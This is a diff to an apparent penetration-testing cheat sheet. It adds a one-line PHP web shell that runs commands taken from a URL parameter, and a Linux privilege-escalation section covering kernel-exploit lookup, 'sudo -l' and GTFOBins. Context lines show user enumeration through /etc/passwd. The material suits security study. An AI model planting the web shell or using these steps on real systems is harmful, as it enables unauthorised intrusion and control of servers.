@@ -21,6 +21,8 @@ https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/
 : Linux pre-installed
 /usr/share/webshells
 
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
 : SecList repo for shells
 https://github.com/danielmiessler/SecLists
 
@@ -136,4 +138,20 @@ cat /etc/passwd | cut -d ":" -f 1
 cat /etc/passwd | grep home
 -> Show users in the home folder
 
+========================
+| Privilege Escalation |
+========================
 
+:: Linux
+
+: Kernel Exploit
+
+uname -a 
+-> Find the current kernel version and look for an exploit. 
+-> Follow the instructions
+
+: Sudo
+
+sudo -l
+-> Find out which programs may be run with sudo
+-> Use GTFOBins to look for ways to exploit these programs
